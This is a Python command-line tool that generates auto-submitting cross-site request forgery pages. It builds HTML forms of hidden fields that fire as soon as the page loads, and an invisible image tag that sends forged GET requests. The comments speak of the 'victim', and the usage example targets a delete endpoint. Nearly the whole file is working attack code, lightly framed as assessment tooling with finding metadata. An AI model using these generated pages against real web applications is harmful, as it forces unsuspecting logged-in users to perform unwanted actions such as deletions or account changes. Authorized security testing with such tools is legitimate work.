#!/usr/bin/env python3
"""
CSRF PoC Generator — creates a complete, auto-submitting HTML CSRF proof-of-concept.

Supports:
  - application/x-www-form-urlencoded
  - multipart/form-data
  - text/plain
  - Auto-submit via JavaScript
  - GET with query params
  - POST with form fields
"""

import argparse
import json
import sys
import os
import time
import html
import urllib.parse
from typing import Optional


HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>CSRF PoC — {method} {path}</title>
<style>
  body {{ font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #0d1117; color: #c9d1d9; padding: 2rem; }}
  .card {{ background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 1.5rem; margin-bottom: 1rem; }}
  h1 {{ color: #f85149; font-size: 1.25rem; }}
  .field {{ margin-bottom: 0.75rem; }}
  .field label {{ display: block; color: #8b949e; font-size: 0.75rem; text-transform: uppercase; margin-bottom: 0.25rem; }}
  .field input, .field textarea {{ width: 100%; background: #0d1117; border: 1px solid #30363d; border-radius: 4px; padding: 0.5rem; color: #c9d1d9; font-family: monospace; box-sizing: border-box; }}
  .badge {{ display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 0.75rem; }}
  .badge-danger {{ background: #da3633; color: #fff; }}
  .badge-warn {{ background: #d29922; color: #000; }}
  .notice {{ background: #1c2128; border-left: 3px solid #d29922; padding: 1rem; margin: 1rem 0; font-size: 0.875rem; }}
</style>
</head>
<body>
<div class="card">
  <h1>CSRF Proof-of-Concept <span class="badge badge-danger">{method}</span></h1>
  <p><strong>Target:</strong> {target_url}</p>
  <p><strong>Content-Type:</strong> <span class="badge badge-warn">{enctype}</span></p>
  <p><strong>Auto-Submit:</strong> {auto_submit}</p>
</div>
<div class="notice">
  <strong>Open this HTML file in a browser.</strong><br>
  Form auto-submits ({auto_submit}).{wait_text}
</div>
<div class="card">
  <form action="{target_url}" method="{form_method}" enctype="{enctype}" id="csrf-form">
{hidden_fields}
  <p><em>{num_fields} parameter(s) will be sent.</em></p>
{submit_button}
  </form>
</div>
{auto_submit_script}
</body>
</html>"""


GET_POC_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>CSRF PoC — GET {path}</title>
<style>
  body {{ font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #0d1117; color: #c9d1d9; padding: 2rem; }}
  .card {{ background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 1.5rem; margin-bottom: 1rem; }}
  h1 {{ color: #f85149; font-size: 1.25rem; }}
  .badge {{ display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 0.75rem; }}
  .badge-danger {{ background: #da3633; color: #fff; }}
  .notice {{ background: #1c2128; border-left: 3px solid #d29922; padding: 1rem; margin: 1rem 0; font-size: 0.875rem; }}
</style>
</head>
<body>
<div class="card">
  <h1>CSRF PoC <span class="badge badge-danger">GET</span></h1>
  <p><strong>Target:</strong> <code>{target_url}</code></p>
  <p>GET-based CSRF — request fires on page load via &lt;img&gt; or auto-redirect.</p>
</div>
<div class="notice">
  <strong>On page load, the request fires automatically.</strong><br>
  No user interaction required. Check your browser DevTools Network tab.
</div>
<div class="card">
  <p><strong>Request URL:</strong></p>
  <textarea rows="3" readonly style="width:100%;font-family:monospace;">{target_url}</textarea>
</div>
<img src="{target_url}" style="display:none;" onerror="document.querySelector('.notice').textContent += ' Request fired.'">
</body>
</html>"""


CSS_HIDDEN = "display:none;"


def _escape_html(s: str) -> str:
    return html.escape(s)


def _build_hidden_fields(params: dict, enctype: str) -> str:
    lines = []
    for key, val in params.items():
        safe_key = _escape_html(key)
        safe_val = _escape_html(val)
        field_type = "hidden"
        if enctype == "multipart/form-data" and "filename" in key.lower():
            field_type = "file"
        lines.append(
            f'    <input type="{field_type}" name="{safe_key}" value="{safe_val}" style="{CSS_HIDDEN}">'
        )
    return "\n".join(lines)


def _build_auto_submit_script(auto_submit: bool) -> str:
    if not auto_submit:
        return ""
    return """<script>
(function() {
  // Wait for DOMContentLoaded
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', function() {
      document.getElementById('csrf-form').submit();
    });
  } else {
    document.getElementById('csrf-form').submit();
  }
})();
</script>"""


def _build_submit_button(auto_submit: bool) -> str:
    if auto_submit:
        return "  <p><em>(Form auto-submits — no button needed for victim)</em></p>"
    return (
        '  <p><button type="submit" style="background:#da3633;color:#fff;border:none;padding:0.5rem 1rem;border-radius:4px;cursor:pointer;">'
        "Trigger CSRF (victim would not need to click this &mdash; auto-submit is disabled for manual testing)</button></p>"
    )


def _parse_params(param_list: list) -> dict:
    params = {}
    for item in param_list:
        if "=" in item:
            k, v = item.split("=", 1)
            params[k.strip()] = v.strip()
        else:
            sys.stderr.write(f"[!] Skipping malformed param: {item}\n")
    return params


def _build_query_string(params: dict) -> str:
    return urllib.parse.urlencode(params)


def generate_poc(
    target_url: str,
    method: str,
    params: dict,
    enctype: str,
    auto_submit: bool,
    context: Optional[str],
) -> str:
    parsed = urllib.parse.urlparse(target_url)
    path = parsed.path or "/"
    method_upper = method.upper()

    if method_upper == "GET":
        qs = _build_query_string(params)
        full_url = target_url + ("&" if "?" in target_url else "?") + qs if qs else target_url
        target_display = _escape_html(full_url)
        poc = GET_POC_TEMPLATE.format(
            path=_escape_html(path),
            target_url=target_display,
        )
        return poc

    form_method = "POST"
    hidden_fields = _build_hidden_fields(params, enctype)
    submit_button = _build_submit_button(auto_submit)
    auto_submit_script = _build_auto_submit_script(auto_submit)
    wait_text = " Victim sees a brief flash before the browser dispatches the forged request." if auto_submit else ""

    poc = HTML_TEMPLATE.format(
        method=method_upper,
        path=_escape_html(path),
        target_url=_escape_html(target_url),
        enctype=_escape_html(enctype),
        auto_submit="Yes" if auto_submit else "No (manual trigger)",
        wait_text=wait_text,
        hidden_fields=hidden_fields,
        num_fields=len(params),
        submit_button=submit_button,
        auto_submit_script=auto_submit_script,
        form_method=form_method,
    )
    return poc


def main():
    parser = argparse.ArgumentParser(
        description="CSRF PoC Generator — create auto-submitting HTML CSRF proof-of-concept pages",
        epilog="Example: python3 csrf_poc_generator.py --target-url https://example.com/api/delete --method POST --params id=123 token=abc --enctype application/x-www-form-urlencoded --auto-submit",
    )
    parser.add_argument("--target-url", required=True, help="Target endpoint URL")
    parser.add_argument(
        "--method",
        default="POST",
        choices=["GET", "POST"],
        help="HTTP method (default: POST)",
    )
    parser.add_argument(
        "--params",
        nargs="*",
        default=[],
        help="Form parameters as key=value pairs (e.g. --params id=1 name=test)",
    )
    parser.add_argument(
        "--enctype",
        default="application/x-www-form-urlencoded",
        choices=[
            "application/x-www-form-urlencoded",
            "multipart/form-data",
            "text/plain",
        ],
        help="Form encoding type (default: application/x-www-form-urlencoded)",
    )
    parser.add_argument(
        "--auto-submit",
        action="store_true",
        default=True,
        help="Include JavaScript to auto-submit the form on page load (default: on)",
    )
    parser.add_argument(
        "--no-auto-submit",
        action="store_true",
        help="Disable auto-submit (requires victim to click submit)",
    )
    parser.add_argument("--context", default=None, help="Assessment context string")
    parser.add_argument("--dry-run", action="store_true", help="Print what would be generated without saving")
    parser.add_argument("--output", default=None, help="Output HTML file path (default: csrf_poc_<target>.html)")
    parser.add_argument("--quiet", action="store_true", help="Suppress progress output on stderr")
    args = parser.parse_args()

    if args.quiet:
        sys.stderr = open("/dev/null", "w")

    params = _parse_params(args.params)
    auto_submit = not args.no_auto_submit

    sys.stderr.write(f"[*] CSRF PoC Generator\n")
    sys.stderr.write(f"[*] Target: {args.target_url}\n")
    sys.stderr.write(f"[*] Method: {args.method}\n")
    sys.stderr.write(f"[*] Enctype: {args.enctype}\n")
    sys.stderr.write(f"[*] Params: {params}\n")
    sys.stderr.write(f"[*] Auto-submit: {auto_submit}\n")
    if args.context:
        sys.stderr.write(f"[*] Context: {args.context}\n")

    poc_html = generate_poc(args.target_url, args.method, params, args.enctype, auto_submit, args.context)

    if args.dry_run:
        sys.stderr.write("[*] Dry-run mode — no file written\n")
        finding = {
            "target_url": args.target_url,
            "method": args.method,
            "enctype": args.enctype,
            "parameters": list(params.keys()),
            "auto_submit": auto_submit,
            "dry_run": True,
            "context": args.context,
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        }
        print(json.dumps(finding, indent=2))
        return

    parsed = urllib.parse.urlparse(args.target_url)
    safe_host = parsed.hostname.replace(".", "_") if parsed.hostname else "target"
    filename = args.output or f"csrf_poc_{safe_host}_{parsed.path.strip('/').replace('/', '_') or 'index'}.html"
    dest = os.path.join(os.getcwd(), filename)

    with open(dest, "w") as f:
        f.write(poc_html)

    finding = {
        "target_url": args.target_url,
        "method": args.method,
        "enctype": args.enctype,
        "parameters": list(params.keys()),
        "auto_submit": auto_submit,
        "poc_file": dest,
        "context": args.context,
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    }
    jsonl_path = dest.rsplit(".", 1)[0] + ".jsonl"
    with open(jsonl_path, "w") as f:
        f.write(json.dumps(finding) + "\n")

    sys.stderr.write(f"\n[*] PoC saved to: {dest}\n")
    sys.stderr.write(f"[*] Finding metadata: {jsonl_path}\n")
    print(json.dumps(finding, indent=2))


if __name__ == "__main__":
    main()